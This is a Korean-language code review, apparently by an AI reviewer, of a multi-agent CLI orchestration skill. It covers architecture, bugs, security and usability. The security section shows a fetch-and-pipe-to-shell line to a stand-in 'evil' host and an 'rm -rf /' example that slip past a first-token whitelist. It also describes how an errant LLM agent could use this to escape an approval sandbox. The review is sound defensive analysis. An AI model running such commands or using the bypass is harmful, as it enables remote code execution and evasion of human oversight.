---
evaluator: Claude (Opus 4.8) — 외부 리뷰어 (사전 지식 없이 코드만 읽고 판단)
date: 2026-06-29
target: skills/cli-agent-team/
method: SKILL.md + scripts/*.sh + references/ 직접 정독, install-skill.ps1로 배포 경로 교차 검증
---

# cli-agent-team 코드 리뷰 (외부 리뷰어)

## 0. 요약

Claude를 오케스트레이터로 두고 외부 CLI(codex·agy)를 Bash로 부리는 다중 에이전트 루프.
설계 의도와 운영 시나리오 분해(리밋 대응·적응형 배분·게이트)는 인상적이지만, **"문서가
약속한 것"과 "코드가 실제로 하는 것" 사이의 간극**이 곳곳에 있다. 가장 심각한 두 가지:
(1) `verify.sh`의 명령어 화이트리스트는 **첫 토큰만 검사하고 전체 문자열을 `bash -c`로
실행**해 사실상 우회 가능한 보안 극장(security theater)이다. (2) `dashboard.sh`·
`record-score.sh`의 프로젝트 루트 추정(`../../..`)은 **문서가 안내하는 설치 방식
(`install-skill.ps1`)을 따르는 순간 깨진다.** 리뷰 대상에 명시된 `docs/quickstart.md`는
**아예 존재하지 않는다.**

---

## 1. 아키텍처 설계 — 6/10

### 좋은 결정

- **상태의 단일 출처 분리**: 루프 재개 상태를 `_agent_reports/.session_state` 한 파일에
  몰아넣고(SKILL.md:303~334) 새 세션이 그것만 읽으면 재개되게 한 것은 견고한 패턴이다.
  "MCP 서버 대신 스킬" 결정(SKILL.md:16~20)도 근거가 타당하다 — 외부 CLI 호출은 Bash로
  충분하고 완료 감지는 `run_in_background`로 충분하다는 판단은 옳다.
- **단일 진입점 래퍼**: `agent-team.sh`가 12개 스크립트를 `case`로 디스패치(agent-team.sh:41~62).
  경로 없이 호출 가능하게 한 것은 사용성 측면에서 좋은 추가다.
- **dispatch 스냅샷 기반 스코프 검사**: `dispatch.sh:249~255`가 작업 전 변경 파일을
  `.pre_dispatch_files`로 스냅샷하고, `verify.sh:90~104`가 `comm -23`로 dispatch 이후
  변경분만 비교하는 것은 "작업 이전 변경"을 오탐하지 않게 하는 정교한 처리다.

### 문제 있는 결정

- **런타임이 LLM이다**: 오케스트레이터 루프 전체가 SKILL.md ~950줄의 한국어 산문으로만
  존재하고, 어떤 드라이버 스크립트도 단계 순서를 강제하지 않는다. 단계 1→1.5→1.6→2→…→9의
  정합성은 전적으로 "Claude가 산문을 정확히 따른다"에 의존한다. 스크립트는 도구일 뿐,
  상태기계가 코드로 박제돼 있지 않다. 복잡한 프로젝트에서 단계 누락·순서 뒤바뀜이 발생하면
  검출 수단이 없다.
- **설치 위치 가정의 불일치 (확정 버그)**: `dashboard.sh:23`과 `record-score.sh:17`은
  `PROJECT_ROOT="$(cd "${SCRIPT_DIR}/../../.." && pwd)"`로 프로젝트 루트를 추정한다. 이는
  스킬이 `<project>/skills/cli-agent-team/scripts`에 있을 때만 맞다. 그러나 문서가 안내하는
  설치(`install-skill.ps1:38~41`)는 `~/.claude/skills/cli-agent-team` 또는
  `<project>/.claude/skills/cli-agent-team`에 복사한다. 그러면 `../../..`는 각각 `~/.claude`,
  `<project>/.claude`로 빠져 **엉뚱한 `_agent_reports`를 가리킨다.** `record-score.sh`는
  `verify.sh:322`가 `$PROJECT_DIR`를 5번째 인자로 넘겨 구제되지만, `dashboard.sh`는 인자로
  프로젝트 경로를 받는 통로 자체가 없어 **설치 후 무조건 깨진다.** 반면 `dispatch.sh`·
  `verify.sh`는 `[project-dir]` 인자를 받아 위치 독립적이다 — 같은 스킬 안에서 경로 처리
  철학이 둘로 갈린다.
- **공유 상태에 동시성 보호가 없다**: 병렬 모드(SKILL.md:589~603)에서 두 에이전트가 동시에
  `LOG.md`·`.agent_scores.json`에 기록하는데, `record-score.sh`는 read-modify-write
  (record-score.sh:136~155)를 락 없이 수행한다. 병렬 dispatch 시 점수 파일 손상/유실 경로가
  열려 있다.

---

## 2. 코드 품질 — 6/10

### 일관성·견고성 (잘 된 부분)

- 대부분의 스크립트가 `set -euo pipefail`(dispatch.sh:26, verify.sh:17, parallel-check.sh:19
  등)과 `${VAR:?msg}` 필수 인자 패턴을 일관되게 쓴다.
- `dispatch.sh:31~44`의 EXIT 트랩은 실전 함정을 정확히 짚었다 — 에이전트가 내부 검증 중
  `dispatch.sh`를 재귀 호출해 non-zero가 전파되는 문제를, REPORT.md의 `[x]`와 타임스탬프로
  성공 판정해 우회한다. 현장 디버깅의 흔적이 보인다. **단, 이 우회에는 실패 은폐 가장자리가
  있다**: 새 REPORT.md에 `- [x]` 한 줄만 있으면 실제 크래시·타임아웃도 "성공"으로 보고된다.
  `verify.sh`의 AC 검사가 백스톱이라 영향은 제한적이지만, 정상 종료가 아닌데 성공으로
  넘어가는 경로가 열려 있다는 점은 칭찬과 함께 기록해 둔다.
- Windows Git Bash의 awk 한글 패턴 미지원을 grep+tail+head로 우회한 `extract_section`
  (verify.sh:56~69, parallel-check.sh:38~51)도 실측 기반 대응이다.

### 숨은 버그·취약 패턴

- **`init.sh`만 `set -euo pipefail`이 없다** (init.sh:1~2는 셰방+주석뿐). 대화형 입력 검증을
  수동 `if`로 하지만, 다른 스크립트와 방어 수위가 다르다. 또한 `init.sh`는 권한 수준 기본값을
  **`완전자율`로 써넣는다**(init.sh:165). 이는 SKILL.md:27~29("절대 기본값으로 가정하지
  않는다")·SKILL.md:249("제한된 자율(기본 권장)")와 **정면으로 모순**된다. 스캐폴딩 도구가
  가장 위험한 모드를 디폴트로 박는다.
- **`extract_section` 종료 패턴 불일치**: `verify.sh:63`은 다음 섹션 경계를 `^##[^#]`로,
  `parallel-check.sh:45`는 `^## `로 찾는다. 후자는 `### 하위제목`을 경계로 오인하지 않지만
  전자는 `##`로 시작하는 모든 H2를 잡는다 — 두 스크립트가 같은 헬퍼의 다른 버전을 복붙해
  유지보수 부채가 됐다.
- **모델 ID 하드코딩**: `dispatch.sh:301~302,342~343`에 `gpt-5.5`/`gpt-5.4-mini`/
  `claude-sonnet-4-6`/`claude-haiku-4-5-20251001`이 박혀 있다. 모델은 가장 빨리 노후화되는
  값인데 conf로 빼지 않았다. 6개월 뒤 조용히 실패하거나 구버전을 쓴다.
- **`dashboard.sh --watch`의 대화형 의존**: `read -t 1 -n 1`(dashboard.sh:304)은 Windows
  Git Bash에서 신뢰도가 낮고, 시계 행 덮어쓰기(dashboard.sh:299~300)의 고정폭 문자열은
  `print_header`(dashboard.sh:222~224) 실제 출력 폭과 다르다 — watch 모드는 정렬이 깨질
  공산이 크다.
- **`dispatch.sh`의 환경 종속 명령 누출**: execute 프롬프트(dispatch.sh:270~276)가 에이전트에게
  `rtk grep`·`codebase-memory-mcp`를 쓰라고 지시한다. 이 스킬은 "친구·팀원에게 배포"가
  목표(상위 CLAUDE.md)인데, RTK·해당 MCP가 없는 환경의 서브 에이전트는 존재하지 않는 명령을
  지시받는다. 재사용 단위에 개인 환경 가정이 새어 들어갔다.

---

## 3. 보안 — 4/10

### 핵심 결함: 화이트리스트가 우회 가능하다 (security theater)

`verify.sh:191~202`:

```bash
_cmd_bin=$(echo "$cmd" | sed 's/^[[:space:]]*//' | cut -d' ' -f1 | sed 's|.*/||')
_wl="bash sh npm npx ... rtk"
for _w in $_wl; do [ "$_cmd_bin" = "$_w" ] && _ok=true && break; done
...
if (cd "$PROJECT_DIR" && bash -c "$cmd" >"$TMPOUT" 2>&1); then
```

검사는 **첫 토큰만** 보고(`cut -d' ' -f1`), 실행은 **문자열 전체**를 `bash -c`로 한다.
따라서 `AGENT_ROLES.md`의 `## 자동 검증 명령어`에:

```
test: npm test && curl http://evil/x | sh
```

라고 적히면 첫 토큰 `npm`이 화이트리스트를 통과하고, `&& curl ... | sh`까지 그대로 실행된다.
`;`, `&&`, `|`, `$()`, 백틱 어떤 것도 막히지 않는다.

**이 화이트리스트는 동시에 너무 느슨하고 너무 빡빡하다.** `npm test && rm -rf /`는 통과하지만
(첫 토큰 `npm`), 정상적인 `cd frontend && npm test`는 **거부된다**(첫 토큰 `cd`가 화이트리스트
밖). 정당한 사용을 막으면서 인젝션은 허용하는 검사는 약한 경계가 아니라 **역기능(anti-feature)**
이다.

게다가 `verify.sh`는 5개 검사를 조기 종료 없이 전부 실행하므로, 검사 1(스코프 초과)이
`AGENT_ROLES.md` 변조를 잡아 `FAILED=1`로 기록해도 **검사 3은 그 변조된 명령을 그대로 실행한
뒤다.**

**가장 위험한 곳은 `limited` 모드다.** `full` 모드(`--dangerously-bypass-approvals-and-sandbox`,
dispatch.sh:310)에서는 에이전트가 이미 설계상 호스트 임의 실행 권한을 가지므로 이 우회가 새로
더하는 게 없다. 그러나 `limited` 모드에서는 에이전트 CLI 자체는 승인 게이트로 막혀 있는데,
Claude가 도는 `verify.sh`의 `bash -c`는 **호스트에서 게이트 없이** 실행된다. 즉 `AGENT_ROLES.md`에
한 줄 심으면 **샌드박스 경계를 가로질러 권한이 상승한다(privilege escalation).** 이것은 단순한
"공격면"이 아니라 신뢰 경계를 우회하는 경로이며, 위협 모델은 "외부 공격자"가 아니라
"오작동/탈선한 LLM 에이전트"로도 충분히 성립한다.

### 보조 방어선의 한계

- `verify.sh:263~300`의 시크릿/위험 명령 스캔은 추가된 줄만 정규식으로 본다. 좋은 시도지만
  `eval $`(verify.sh:288)는 잡아도 위 `bash -c` 경로는 못 막고, 변수화·base64·줄바꿈으로
  쉽게 회피된다. **린트지 경계가 아니다** — 그렇게 문서화돼야 한다.
- 권한 게이팅 자체는 잘 설계됐다: `--dangerously-*` 플래그를 프로젝트마다 명시 확인하고
  (SKILL.md:245~255) 사유를 `AGENT_ROLES.md`에 남긴다. 다만 `init.sh:165`가 이 원칙을
  스캐폴딩에서 무너뜨린다(§2 참조).

### 외부 입력 신뢰

- `TASK_ID`·`task_type`이 파일 경로·`grep`/`jq` 인자로 흘러간다(dispatch.sh:147~149,
  verify.sh:310). 값은 Claude/사용자가 만들지만 검증이 없다 — `record-score.sh`는
  agent/task_type/정수를 엄격히 화이트리스트 검증(record-score.sh:55~81)하는 반면,
  `dispatch.sh`의 `TASK_ID`는 무검증으로 `_agent_reports/${TASK_ID}` 경로에 쓰인다. 같은
  코드베이스에서 입력 신뢰 정책이 들쭉날쭉하다.

---

## 4. 실용성 — 5/10

- **`docs/quickstart.md`가 없다.** 리뷰 대상으로 명시됐고 "5분 온보딩" 평가를 요구했지만
  `skills/cli-agent-team/` 아래 `docs/` 디렉토리 자체가 없다(glob `**/quickstart*` → 0건).
  온보딩 문서의 현실성을 평가할 대상이 부재하다 — 이것 자체가 실용성 감점이다.
- **5분 온보딩은 비현실적이다.** 실제 의존성 체인: 스킬 설치 → codex/agy 설치 → Node.js +
  `pty-bridge` `npm install`(dispatch.sh:330~337의 ERROR 메시지가 이 3단계를 안내) →
  (선택) `jq`(record-score.sh:28) → (선택) RTK. 특히 agy는 Windows에서 ConPTY 래퍼
  (pty-bridge)가 없으면 출력이 사라진다(dispatch.sh:327). 이건 5분이 아니라 환경 구축
  세션이다. `doctor.sh`가 이 점검을 잘 모아둔 건 큰 장점이다(doctor.sh:88~107).
- **실패 진단성은 좋은 편이다.** `doctor.sh`(11개 항목 OK/WARN/FAIL), `dispatch.sh`의
  `error.log`(dispatch.sh:46~62, 100줄 초과 시 자동 트림), `verify.sh`의 항목별 ✅/❌ 출력과
  실패 원인 코드 분류(verify.sh:332~337)는 사용자가 원인을 짚게 해준다. pty-bridge 미발견
  시의 3-옵션 해결 안내(dispatch.sh:331~337)는 모범적이다.
- **agy 빈 출력 → codex 폴백 자동화**(dispatch.sh:366~392)는 실전에서 가장 자주 막히는
  지점을 자동 복구한다 — 실용적이다.

---

## 5. 놓친 것 / 맹점 — (단일 점수 대신 심각도 태그)

> 이 항목은 단일 결함 목록이라 하나의 점수보다 항목별 심각도가 더 정확하다. [높음]=배포 전
> 차단, [중간]=고쳐야 할 부채, [낮음]=개선 권장 으로 표기한다.

- **[높음] 동시성**: §1에서 지적한 공유 상태 락 부재. 병렬을 1급 기능으로 문서화(SKILL.md:589~603)
  했으면서 `LOG.md`·`.agent_scores.json` 동시 기록 보호가 없다.
- **[높음] worktree 반영의 위험**(worktree-dispatch.sh:82~101): 에이전트 변경을 worktree에서 메인으로
  `cp`로 복사해 되돌린다. (a) `DISPATCH_EXIT`와 무관하게 실행돼 **실패한 작업의 부분 변경도
  메인 작업트리를 오염**시킨다. (b) `[ -f "$src" ]`만 보므로 **삭제된 파일은 반영 안 된다.**
  (c) 임시 브랜치를 지우므로(worktree-dispatch.sh:105~106) 격리 실행의 git 출처가 사라진다 —
  격리의 이점 절반을 스스로 버린다.
- **[중간] 문서/구현 불일치 누적**: (1) quickstart 부재, (2) init.sh의 완전자율 디폴트 vs SKILL.md
  철학, (3) dashboard.sh 경로 가정 vs 설치 방식. 산문이 코드보다 앞서 나간 전형적 신호다.
- **[중간] 확장성**: `dispatch.sh:358~363`는 새 CLI 추가 시 case 블록 직접 편집을 요구한다. 라우팅·
  점수·티어가 codex/agy 2종에 하드코딩(record-score.sh:20)돼 3번째 에이전트 추가 비용이 크다.
- **[중간] 복잡 프로젝트에서 무너지는 지점**: 태스크가 수십 개로 늘면 `dashboard.sh`의 태스크 행
  렌더링과 `extract_section`의 grep 기반 파싱이 O(n) 셸 루프로 누적돼 느려지고, 무엇보다
  상태기계가 코드가 아닌 산문이라 단계 누락이 조용히 누적된다. 검증 게이트가 기계적
  (verify.sh)이라 "AC를 형식적으로 [x] 체크했지만 실제로 안 된" 경우를 못 잡는다 —
  SKILL.md:754가 "exit 0 ≠ 완료"를 경고하지만 그 판단은 다시 LLM에게 떠넘겨진다.

---

## 6. 종합 판정

### 전체 점수: 6/10

야심과 현장 디버깅 흔적(EXIT 트랩, agy 폴백, awk 우회, pty-bridge 안내)은 분명히 평균
이상이다. 그러나 보안 경계가 착시이고, 문서가 약속한 산출물(quickstart)이 없고, 배포 경로에서
대시보드가 깨진다는 점에서 "검증된 도구"라기보다 "잘 만든 1인용 프로토타입"에 가깝다. 작성자
본인이 1개 프로젝트에서 쓰는 용도라면 8, 친구에게 배포하는 재사용 단위로 보면 5 — 중간값 6.

### 이 도구를 추천하는가: **Conditional (조건부)**

- **추천**: 작성자 본인이, 신뢰하는 코드만 다루는 프로젝트에서, codex/agy/node가 이미 깔린
  환경에서 쓸 때. 이 맥락에서는 생산성이 실제로 높다.
- **비추천(고치기 전)**: 제3자 배포, 신뢰 경계가 중요한 코드, 완전자율 모드 상시 사용.
  `verify.sh`의 `bash -c`가 "검증"이라는 이름으로 임의 실행을 수행하는 한, 이 도구의 검증
  단계 자체가 공격면이다.

### 지금 당장 고쳐야 할 것 Top 3

1. **`verify.sh`의 명령 실행을 화이트리스트와 정합시켜라** (verify.sh:191~202). 셸
   메타문자(`;&|$()` 백틱)가 포함된 검증 명령은 거부하거나, `bash -c` 대신 토큰을 배열로
   파싱해 `"${argv[@]}"`로 직접 실행하라. 그리고 스코프 검사(검사 1) 실패 시 검사 3(명령
   실행)을 **건너뛰도록** 조기 분기하라. 지금은 변조 감지와 변조 실행이 같은 실행에서 동시에
   일어난다.

2. **`dashboard.sh`(와 `record-score.sh`)의 프로젝트 루트 추정을 인자 기반으로 바꿔라.**
   `../../..` 하드코딩(dashboard.sh:23, record-score.sh:17)은 `install-skill.ps1`로 설치한
   순간 깨진다. `dispatch.sh`/`verify.sh`처럼 `[project-dir]` 인자(+ `PROJECT_DIR` env
   폴백)를 받아야 위치 독립적이 된다. 현재 `dashboard.sh`는 인자 통로가 아예 없다.

3. **문서/구현 간극을 닫아라**: (a) `docs/quickstart.md`를 실제로 작성하거나 참조에서 빼라.
   (b) `init.sh:165`의 권한 디폴트를 `제한된 자율`로 바꿔 SKILL.md 철학과 맞춰라 — 스캐폴딩이
   가장 위험한 모드를 디폴트로 박는 것은 사고로 이어진다. (c) `dispatch.sh:270~276`의 RTK·
   MCP 지시를 "있을 때만" 조건부로 만들어 배포 이식성을 회복하라.
